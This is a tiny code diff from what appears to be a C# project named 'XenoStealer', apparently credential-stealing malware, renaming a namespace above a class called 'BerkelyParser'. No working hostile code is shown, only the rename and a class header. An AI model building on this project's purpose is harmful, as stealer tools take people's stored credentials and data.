@@ -6,7 +6,7 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace XenoStealer.DataExtraction.Parsers
+namespace XenoStealer
 {
     public class BerkelyParser
     {
